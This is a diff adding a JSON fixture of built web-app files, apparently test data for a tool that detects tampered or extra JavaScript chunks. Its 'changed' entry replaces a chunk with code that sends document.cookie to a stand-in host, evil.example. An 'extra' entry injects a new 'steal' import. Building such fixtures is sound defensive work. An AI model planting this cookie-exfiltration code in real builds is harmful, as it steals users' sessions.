@@ -1,0 +1,16 @@
+{
+  "same": {
+    "/claim/1/0": "<!doctype html><html><head><link rel=\"modulepreload\" href=\"../../_app/immutable/entry/start.A1.js\"><script nonce=\"NONCE\">Promise.all([import(\"../../_app/immutable/entry/start.A1.js\"),import(\"../../_app/immutable/entry/app.B1.js\")]).then(([k,a])=>k.start(a))</script></head><body></body></html>",
+    "/_app/immutable/entry/start.A1.js": "import{a}from\"../chunks/c.C1.js\";export const start=()=>a();",
+    "/_app/immutable/entry/app.B1.js": "export const nodes=[()=>import(\"../nodes/0.D1.js\")];",
+    "/_app/immutable/chunks/c.C1.js": "export const a=()=>1;",
+    "/_app/immutable/nodes/0.D1.js": "import\"../chunks/c.C1.js\";export default 0;"
+  },
+  "changed": {
+    "/_app/immutable/chunks/c.C1.js": "export const a=()=>fetch('https://evil.example/'+document.cookie);"
+  },
+  "extra": {
+    "/_app/immutable/nodes/0.D1.js": "import\"../chunks/c.C1.js\";import\"../chunks/x.E1.js\";export default 0;",
+    "/_app/immutable/chunks/x.E1.js": "export const steal=1;"
+  }
+}
